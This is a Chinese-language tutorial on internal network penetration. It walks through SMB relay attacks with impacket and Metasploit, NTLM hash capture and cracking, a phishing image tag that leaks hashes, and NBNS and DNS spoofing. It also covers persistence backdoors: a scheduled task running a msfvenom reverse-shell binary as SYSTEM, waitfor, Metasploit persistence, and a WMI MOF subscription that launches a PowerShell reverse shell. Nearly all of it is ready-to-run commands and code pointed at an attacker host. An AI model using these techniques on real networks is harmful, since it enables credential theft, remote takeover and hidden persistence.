# 内网渗透技巧

#### 综合利用手法 <a id="-"></a>

**Smbrelay**

**smbrelayx.py**

由于此手法是中间件攻击，需要关闭SMB的签名措施，Windows Server默认开启，其他系统默认关闭，使用nmap扫描一下未开启签名的机器：

```text
nmap -sT -p 445 --open --script smb-security-mode.nse,smb-os-discovery.nse 192.168.111.0/24
```

![](https://p408.ssl.qhimgs4.com/t01604e474c6ef5812c.png)

关闭SMB签名方法：

修改注册表后重新启动：

HKEY\_LOCAL\_MACHIME\System\CurrentControlSet\Services\LanManServer\Paramete

```text
EnableSecuritySignature = 0
RequireSecuritySignature = 0
```

使用impacket中的smbrelayx.py进行中继攻击，目标是192.168.111.251：

```text
python smbrelayx.py -h 192.168.111.251 -c calc.exe
```

![](https://p408.ssl.qhimgs4.com/t01599c575f35b68f28.png)

当其他服务器使用正确的密码访问此服务器时：

![](https://p408.ssl.qhimgs4.com/t01db215995a62ada14.png)

Kali接收到Hash：

![](https://p408.ssl.qhimgs4.com/t010b025e5fda69d950.png)

目标服务器出现calc进程：

![](https://p408.ssl.qhimgs4.com/t016d477f6b8522e2b6.png)

可使用-e参数，执行任务程序：

![](https://p408.ssl.qhimgs4.com/t01835b649858f01e32.png)

可以将hash粘贴出来，使用hashcat进行字典攻击：

```text
hashcat64.exe -a 0 -m 5600 hash.txt pass.txt
```

![](https://p408.ssl.qhimgs4.com/t01d4af64616e9f8aa3.png)

**可制作钓鱼网站，包含以下内容**

```text
<img src="\\192.168.111.41\Admin$">
```

启动服务：

```text
python smbrelayx.py -h 192.168.111.251
```

用户访问时，可获得Hash，当认证方式相同时，也可以执行程序：

![](https://p408.ssl.qhimgs4.com/t0105d954ade8dee3d3.png)

**NBNS欺骗**

Metasploit:

```text
use auxiliary/spoof/nbns/nbns_response
set spoofip 192.168.111.41
run
```

当访问不存在的主机名称时，会发送广播包，如：

```text
net use \\School-Du2\admin$
```

![](https://p408.ssl.qhimgs4.com/t01a34d44e4907b723b.png)

这样会将不存在的主机名称再次解析到192.168.111.41上，完成SMB中继攻击。

**DNS欺骗**

编辑/etc/etter.dns，加入以下字段：

```text
School-DU1.school.com A 192.168.111.41
School-DU2.school.com A 192.168.111.41
```

使用ettercap进行DNS欺骗：

```text
ettercap -T -q -P dns_spoof -M arp /// ///
```

操作系统可能存在DNS缓存，清空缓存命令如下：

```text
ipconfig /displaydns        //查看缓存
ipconfig /flushdns            //清空缓存
```

当Windows请求域名信息时，会被DNS欺骗：

![](https://p408.ssl.qhimgs4.com/t0139d5c7614aed7644.png)

访问共享时，会被DNS欺骗，此环境中欺骗成功，但后续步骤未成功：

![](https://p408.ssl.qhimgs4.com/t01d3ecdccf1ad4ec83.png)

访问School-DU2.school.com时，可成功：

![](https://p408.ssl.qhimgs4.com/t01a78cec9d0bb6ad50.png)

**smb\_relay**

```text
use exploit/windows/smb/smb_relay
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.111.41
set smbhost 192.168.111.150
run
```

当其他机器访问Kali的共享时，可获得目标机器的shell：

![](https://p408.ssl.qhimgs4.com/t01a0a2515c993c8fd4.png)

![](https://p408.ssl.qhimgs4.com/t0142cfc99838b80e9c.png)

**Waitfor后门**

```text
waitfor college && calc.exe         //本地执行
waitfor /s 127.0.0.1 /si college    //测试
waitfor /s IP /si college /U administrator /P 360College
```

![](https://p408.ssl.qhimgs4.com/t0124f2d82e3f8850ce.png)

**At && Schtasks\(需要管理员权限\)**

先生成一个远控程序：

```text
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.111.41 lport=4444 -f exe -o backdoor.exe
```

将远控程序上传至服务器，使用schtasks，要求在用户登录时执行程序，返回shell。

```text
schtasks /create /tn hello /tr C:\Users\linghuchong\Desktop\Tools\backdoor.exe /sc onlogon /ru system
```

用户登录时，成功反弹shell

![](https://p408.ssl.qhimgs4.com/t01034e67ae513c3b81.png)

**Metasploit后门模块**

当获得了一个meterpreter时，可设置后门程序：

```text
background
use exploit/windows/local/persistence
show options
```

![](https://p408.ssl.qhimgs4.com/t01c0e4ff12f6eaee43.png)

```text
set session 6
set delay 60
run
```

![](https://p408.ssl.qhimgs4.com/t01973e6b8678d0dad9.png)

**WMI+MOF**

假设已经获得了管理员权限，可构造MOF后门，MOF文件模板如下：

```text
#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")
instance of CommandLineEventConsumer as $Cons
{
    Name = "Powershell Helper";
    RunInteractively=false;
    CommandLineTemplate="cmd /C 命令";
};

instance of __EventFilter as $Filt
{
    Name = "EventFilter";
    EventNamespace = "Root\\Cimv2";
    Query ="SELECT * FROM __InstanceCreationEvent Within 5" 
           "Where TargetInstance Isa \"Win32_Process\" "
           "And Targetinstance.Name = \"notepad.exe\" ";
    QueryLanguage = "WQL";
};

instance of __FilterToConsumerBinding {
     Filter = $Filt;
     Consumer = $Cons;
};
```

利用msfvenom生成powershell反弹shell的命令：

```text
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.111.41 lport=5555 -f psh-cmd
```

![](https://p408.ssl.qhimgs4.com/t01d800d0aea02c8083.png)

将生成的powershell部分替换模板中的“命令”部分：

![](https://p408.ssl.qhimgs4.com/t014e50c251b65102ff.png)

将mof上传至服务器，在服务器中以管理员身份启动CMD，运行：

```text
mofcomp backdoor.mof
```

![](https://p408.ssl.qhimgs4.com/t012d9ea32cf2b3291f.png)

监听端口，待服务器打开notepad.exe:

![](https://p408.ssl.qhimgs4.com/t01c98af5d46e5ba4d0.png)

其他事件，实测只能监听一个事件：

关闭powershell:

```text
#!sql
"SELECT * FROM __InstanceDeletionEvent Within 5 " 
  "Where TargetInstance Isa \"Win32_Process\" "
  "And Targetinstance.Name = \"powershell.exe\" ";
```

每小时的30分钟：

```text
#!sql
"Select * From __InstanceModificationEvent "
  "Where TargetInstance Isa \"Win32_LocalTime\" "
  "And TargetInstance.Minute = 30 "
```

